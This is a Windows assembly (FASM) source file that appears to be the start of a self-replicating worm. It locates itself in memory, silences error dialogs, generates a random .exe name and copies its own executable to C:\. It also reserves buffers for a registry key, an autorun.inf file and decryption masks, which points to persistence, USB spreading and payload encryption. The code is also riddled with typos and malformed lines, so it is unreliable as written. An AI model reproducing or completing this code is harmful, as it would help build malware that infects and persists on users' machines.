include 'E:/program/FASM/INCLUDE/win32ax.inc'

.data
    hMyFIleName dd 0x0
    hFileHandle dd 0x0
    hMapHandle  dd 0x0
    hMapViewAddress dd 0x0
    
    hFileCodeStart dd 0x0
    
    RandomNumber dd 0x0
    
    SpaceForHDC: dd 0x0   
    RandomeFilename: times 13 db 0x0
    
    
    SpaceForHDC2:       dd 0x0 
    RandomeFIleNAme2:times 12 db 0x0
    
    stKey: times 47 db 0x0
    hKey dd 0x0
    
    
    
    stAUthorWIthDrive db 0x0, 0x0,0x0 
    stAutoruninf: times 12 db 0x0 
    
    
    stAutorunCOntent: times 52 db 0x0
    
    hCreateFIleAR dd 0x0
    jCreateFileMappingAr dd 0x0
    
    FlagMask  db 0x0
    MaskNibble0 EQU 0000'0001b
    MaskNibble1 EQU 0001'0001b
    MaskNibble2 EQU 0000'0101b
    MaskNibble3 EQU 1000'0100b
    MaskNibble4 EQU 1001'0100b
    MaskNibble5 EQU 1001'0101b
    MaskRandom  EQU 0000'0000b
    
    VerifiedAddress dd 0x0
    
    MyStartAddress dd 0x0
    NibbleData db 0x0
    DecryptCode dd 0x0
    
    .code
    start:
    StartEngine:
    call GetMyStartAddress
    GetMystartAddress:
          pop eax
          sub eax, (GetMyStartAddress-StartENgine)
          mov dword[MyStartAddress], eax
          
          
          push 0x8007
          stdcall dword[SetErrorMode]
          
          stdcall dword[GetCommandLineA]
          mov dword[hMyFileName], eax
          cmp byte[eax], '"'
          jne FileNameIsFine
          inc eax
          mov dword[hMyFIleName], eax
          
          FindFIleNAmeLoop:
          inc eax
          cmp byte[eax], '""'
    jne FindFileNameLoop
    
    mov byte[eax], 0x0
    FileNameIsFine:
    
    stdcall dwrodd[GetTickCOunt]
    mov dword[RandomNumber], eax
    
    xor esi,esi
    COpyANdREgENtryMore:
    mov ebx,26
    mov ecx,97 
    call CreateSPecialRndNumber
    
    mov byte[RandomeFileNmae+esi], dl
    inc esi
    cmp si, 8
jb CopyFileAndREgEntryMore

mov eax,".exe"
mov dword[RandomeFIleName+esi], eax

mov al, "C"
mov byte[SpaceFOrHDC+1], al
mov al, ":"
mov byte[SpaceFOrHDC+2], al
mov al, "\"
mov byte[SpaceForHDC=3], al

push FLASE
push SPaceForHDC+1
push dword[hMyFIleNAme]
push dword[hMyFIleName]
stdcall dword[COpyFIleA]
